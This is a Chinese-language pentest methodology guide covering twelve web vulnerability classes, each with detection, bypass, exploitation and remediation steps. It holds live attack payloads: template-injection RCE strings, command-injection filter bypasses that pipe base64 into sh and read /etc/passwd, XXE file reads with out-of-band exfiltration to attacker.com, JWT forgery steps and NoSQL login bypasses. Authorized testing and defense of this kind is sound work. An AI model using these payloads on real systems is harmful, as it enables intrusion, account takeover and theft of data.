# 高级/补充漏洞方向测试（web-advanced-vulns）

> 2026-08 强化新增：覆盖既有文件**缺失或仅给 payload 菜单、无方法论**的方向。每个方向给「检测→验证→利用→修复」完整链路。与 `web-vulns.md`（payload 库）、`auth-testing.md`（认证）、`middleware-unath.md`（中间件）互补。

---

## 1. SSTI 模板注入（Server-Side Template Injection）

> 命中：Jinja2/Flask、Twig/Symfony、Freemarker/Thymeleaf/JSP、Smarty、Velocity、ERB（Ruby）、Mako 等框架渲染用户输入。

**检测（Polyglot 一测多引擎）**：把测试值放进所有输入点，观察是否被求值：
```
{{7*7}} ${7*7} <% =7*7 %> #{7*7} *{7*7} {{7*'7'}}
# 数学运算被渲染成 49 / 77 = 存在模板求值
```
**引擎识别**：`{{7*7}}`→49 是 Jinja2/Twig；`${7*7}`→49 是 Freemarker；`<%= 7*7 %>`→49 是 ERB；`#{7*7}`→49 是 Velocity。
**关键利用（各引擎）**：
```
# Jinja2 → RCE
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[<idx>]('whoami',shell=True,stdout=-1).communicate()}}
{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('id').read()}}
# Twig → RCE（filter 链）
{{['id']|filter('system')}}
# Freemarker → RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Thymeleaf（Spring）→ RCE（表达式解析）
__${T(java.lang.Runtime).getRuntime().exec('id')}__
# Velocity
#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
**验证标准**：`{{7*7}}` 返回 `49` 即命中；进一步执行 `id`/`whoami` 确认 RCE（PoC 级，别做破坏动作）。
**修复**：模板引擎开启 autoescape/沙箱；**用户输入不得进模板渲染**；严格校验模板文件来源。

---

## 2. 命令注入 / 代码执行（OS Command Injection / RCE）

> 命中：拼接系统命令的参数——ping、nslookup、dig、whois、tar、zip、curl、wget、ffmpeg、图片处理（ImageMagick）、文件转换、下载器、cron 类接口。

**检测（先无破坏性）**：
```
; sleep 5 | sleep 5 && sleep 5 || sleep 5 %0a sleep 5
`sleep 5` $(sleep 5)
# 对比响应时间：基线 vs 注入后延迟 ≈ 5s = 时间盲注确认
# 或 OOB 确认：; nslookup attacker.oast.pro  /  curl http://attacker/$RANDOM  → OAST 回连
```
**绕过矩阵（WAF/过滤对抗）**：
```
空格: ${IFS} 或 ${IFS:0:1} 或 $IFS$9 或 %09(制表) 或 < 或 {cat,/etc/passwd}
引号: "i"d 或 'i''d' 或 base64: echo Y3VybA==|base64 -d|sh
分隔: ; | && || %0a \n（URL编码 %0A）换行
通配: /b??/c?a? /???/??t?  路径通配
黑名单绕过: 大小写混写 caT / 变量拼接 p$1s / 反斜杠 l\s
```
**验证标准**：延迟 5s 或 OAST 回连；PoC 用 `id`/`whoami` 即可，不执行破坏性命令。
**修复**：**禁止拼接 shell**，用 `exec()` 白名单数组参数（不经过 shell）；严格输入白名单；沙箱/最小权限运行。

---

## 3. XXE（XML 外部实体）

> 命中：任何接收 XML 的接口——SOAP、Docx/XLSX 上传解析、SVG 上传、RSS/Atom 导入、JWT RS256 导出 XML、部分 JSON 接口（可改 Content-Type 为 XML）。

**直接读取**：
```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
# Windows: file:///c:/windows/win.ini   协议: file / http / ftp / gopher / jar:
```
**盲 XXE（OOB 外带）**：
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">   # dtd 里把 %file; 拼进外带URL
%param;
```
**绕过限制**：参数实体（%xxe;）、UTF-16 编码绕 WAF、DOCTYPE 变形、SYSTEM 换 PUBLIC。
**利用面**：文件读取（/etc/passwd、应用配置含密钥）、内网探测（http://127.0.0.1:xxx）、SSRF 链、DoS（Billion Laughs 慎测）。
**验证标准**：响应回显文件内容 / OAST 回连 / 报错回显路径。
**修复**：XML 解析器禁用 DTD/外部实体（libxml2: `LIBXML_NONET` 且不加载外部 entity）；用 JSON 优先；上传文件按白名单类型处理。

---

## 4. CORS 配置错误

> 命中：跨域接口，尤其带 Cookie 的接口、第三方登录回调、API 网关。

**检测**：任意 Origin 请求 + 看响应头：
```
curl -s -H "Origin: https://evil.com" -I https://target.com/api/me
# 命中特征：
#   Access-Control-Allow-Origin: https://evil.com   （原样反射）
#   Access-Control-Allow-Credentials: true          （携带凭据 → 高危）
# 危险变体：null Origin、*.target.com 通配、Origin 前缀匹配（target.com.evil.com）
```
**利用**：诱导受害者访问恶意页 → fetch 带凭据跨域读 `api/me` → 窃取个人/订单数据。
**验证标准**：`Allow-Origin` 反射攻击者 Origin 且 `Allow-Credentials:true` → 可构造 PoC 页。
**修复**：白名单精确 Origin，禁止 `*` 配合凭据；校验 `Sec-Fetch-Site`/`Origin`；敏感接口用 CSRF token 兜底。

---

## 5. 子域接管（Subdomain Takeover）

> 命中：DNS 的 CNAME 指向已释放的第三方服务（GitHub Pages/S3/Heroku/Azure/Cloudflare/Shopify）而 DNS 未清理。

**检测流程**：
```
# 1. 子域枚举（subfinder/FOFA/证书透明日志）→ CNAME 解析
dig CNAME <sub>.target.com
# 2. CNAME 指向可接管服务 且 该服务资源已释放（Nxdomain/GitHub 404/Azure error page）→ 可接管
# 关键判断：CNAME 目标返回
#   NXDOMAIN / GitHub 404 "There isn't a GitHub Pages site" / S3 NoSuchBucket / Heroku no such app
# 3. 验证：按服务要求注册同名资源（GitHub repo / S3 bucket / Heroku app）
```
**常见可接管服务指纹**：GitHub Pages、AWS S3/CloudFront、Azure、Heroku、Netlify、Shopify、SendGrid、Zendesk、Fastly。
**利用**：接管后在该子域部署钓鱼页/挂马，借目标域名信任偷 cookie、钓鱼凭据。
**验证标准**：注册资源后子域返回自己内容 = 接管成功。
**修复**：清理/更新失效 CNAME；DNS 变更审计；对第三方托管域名做定期校验。

---

## 6. Host Header 注入

> 命中：基于 Host 拼 URL/邮箱/重置链接的后端逻辑——密码重置邮件、邮箱验证、SSRF、OAuth 回调、缓存键。

**检测**：
```
curl -s -H "Host: evil.com" https://target.com/login        # 页面出现 evil.com 链接/表单
curl -s -H "Host: evil.com" "https://target.com/password-reset"
# 命中特征：响应里的 action=、href=、location:、邮箱模板、meta 引用了攻击者 Host
```
**经典利用：密码重置投毒**：
```
POST /forgot-password  Host: attacker.com
# 后端发邮件: https://attacker.com/reset?token=xxx  → 收到含重置链接的邮件 → 重置任意账号
# 变体：X-Forwarded-Host / Forwarded / X-Original-Host 头
```
**验证标准**：响应/邮件中出现攻击者控制的 Host；重置链接指向攻击者域。
**修复**：不使用 Host 头拼接，用配置的绝对域名；校验 Host 白名单；邮件链接用 `SERVER_NAME` 或配置项。

---

## 7. Web 缓存投毒 / 缓存欺骗

> 命中：CDN/反向代理缓存（Cloudflare、LiteSpeed 缓存、Nginx proxy_cache）+ 可污染缓存键的行为。

**缓存投毒（Cache Poisoning）检测**：
```
# 1. 找缓存键：正常响应是否有 Cache-Control/x-cache 头、相同 URL 响应是否缓存
# 2. 找 Unkeyed 参数/头：加 X-Forwarded-Host: evil.com 或 ?utm_source=xxx 看响应变化但仍是缓存命中
#    → 缓存键不包含该参数/头 → 可投毒
# 3. 若 unkeyed 输入被反射进响应 → 缓存污染全局受害
curl -s -H "X-Forwarded-Host: attacker.com" -I "https://target.com/"
curl -s "https://target.com/?cachebust=<script>alert(1)</script>"
```
**缓存欺骗（Cache Deception）**：`/api/me/profile.css` 或 `/profile.php/./x.css` → 后端返回敏感 JSON，缓存层当作静态 CSS 缓存 → 公开泄露。
**验证标准**：投毒 payload 被缓存并分发给其他用户 / 敏感数据被缓存公开。
**修复**：仅缓存静态资源白名单路径；校验缓存键完整性；`Cache-Control: no-store` 敏感接口；规范化路径。

---

## 8. 开放重定向

> 命中：登录跳转 `?redirect=`、OAuth `redirect_uri`、`?next=`、`?url=`、`?return=`、支付回调、导出链接。

**检测**：
```
/redirect?url=https://evil.com
/redirect?url=//evil.com            # 协议相对
/redirect?url=https://evil.com@target.com
/redirect?url=https:%2f%2fevil.com  # 编码绕过
/redirect?url=javascript:alert(1)
# 命中：响应 302 Location 或页面 JS 跳转到 evil.com
```
**利用**：钓鱼链接（域名可信但跳转 evil）、OAuth 流程窃取授权码（redirect_uri 未严格校验）、SSRF 辅助（`url=http://127.0.0.1`）。
**验证标准**：302/JS 跳转攻击者域名；且认证后跳转会携带 token。
**修复**：白名单跳转域名；不拼用户输入到 Location；OAuth `redirect_uri` 精确匹配。

---

## 9. Mass Assignment（批量赋值）

> 命中：注册/资料修改/创建资源接口直接绑定请求参数到对象字段。

**检测**：改包加业务字段参数，看是否被接受：
```
POST /register  正常参数 + role=admin / is_admin=1 / level=9 / verified=true / balance=999999 / active=1
POST /profile/update  + credit=10000 / type=premium / quota=unlimited
# 命中：注册/更新后对应字段生效（登录后验证权限提升、积分变化）
# 典型参数：role is_admin admin verified vip level type status balance credit permission
```
**验证标准**：附加参数生效且未在服务端白名单（如某站注册 role=admin 参数被接受，待验证是否提权）。
**修复**：服务端**字段白名单**（DTO/批量赋值白名单），只绑定允许字段；禁止直接 `Model::create($request->all())`。

---

## 10. JWT 攻击专项

> 命中：登录/授权返回 JWT 的接口（含 API 网关）。工具：jwt_tool（解析/混淆/爆破）。

**测试流程（逐步）**：
```
1. 解码：jwt_tool <token>
   → 看 alg、payload、exp/nbf/iss/aud 校验点
2. 算法混淆：RS256→HS256（用公钥当 HMAC 密钥签名）
   jwt_tool <token> -X s -pk public.pem
3. alg=none：改头为 {"alg":"none"} 空签名 → 直接伪造
   jwt_tool <token> -X a
4. 密钥爆破：hashcat -m 16500 或 jwt_tool -C -d dict.txt  （弱密钥/默认密钥）
5. kid 注入：kid 支持文件路径/数组 → 指向可控文件/密钥
6. jku/jwk：head 里 jku 指向攻击者 JWKS → 服务器信任 → 伪造任意签名
7. 重放/过期：篡改 exp 延长、旧 token 未失效
```
**验证标准**：篡改 payload 后 token 仍被接受（提权/越权生效）。
**修复**：固定 alg 白名单；校验 iss/aud/exp；密钥高强度且保密；不信任客户端 jku/jwk。

---

## 11. HTTP 请求走私（CL.TE / TE.CL）

> 命中：前端代理（CDN/负载均衡/LiteSpeed）+ 后端服务器解析不一致。工具：Burp 插件 HTTP Request Smuggler。

**检测**（最小化探测，防毒）：
```
# CL.TE：Content-Length 与 Transfer-Encoding 冲突，前端用 CL 后端用 TE
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
# TE.CL：前端用 TE 后端用 CL
# TE.TE：TE 头变形绕前端校验
```
**利用**：走私请求夹带 → 绕过前端 WAF/认证、缓存投毒、越权访问后端、窃取其他用户请求。
**验证标准**：差异响应/延迟/时序异常；Burp Smuggler 插件自动化判定。
**修复**：前后端统一解析；拒绝同时含 CL 与 TE 的请求；代理规范化请求。

---

## 12. NoSQL 注入（MongoDB 等）

> 命中：Node.js/MongoDB 栈的 JSON 接口，登录/查询参数直接进查询构造器。

**检测**：
```
# JSON 操作符注入
{"username":{"$ne":null},"password":{"$ne":null}}      # 绕过认证
{"username":"admin","$where":"sleep(5000)"}            # 时间盲注（$where）
{"id":{"$gt":"0"}}                                     # 越权遍历
# URL 编码版：username[$ne]=null&password[$ne]=null
# 数组注入：?id[]=1&id[]=2
```
**验证标准**：`$ne:null` 绕过登录（返回成功）；`$gt` 枚举数据；`$where` 延迟。
**修复**：不用拼接的查询构造器，用参数化查询；`$where`/`$function` 禁用；输入 schema 校验。

---

## 对照：本文件与既有文件的职责边界

| 方向 | 本文件给 | 既有文件给 |
|------|---------|-----------|
| SSTI/命令注入/XXE | 检测+绕过+利用+修复方法论 | web-vulns.md payload 菜单 |
| 请求走私 | 检测+利用流程 | middleware-unath.md 单行 |
| JWT | 逐步攻击流程 | auth-testing.md 提及 + jwt_tool 工具 |
| CORS/子域接管/Host头/缓存/MassAssignment/开放重定向 | 全新方向 | 缺失 |

> ⚠️ 所有验证：PoC 级即可，不执行破坏性/数据修改动作；遵守授权范围与速率（防反爬）。
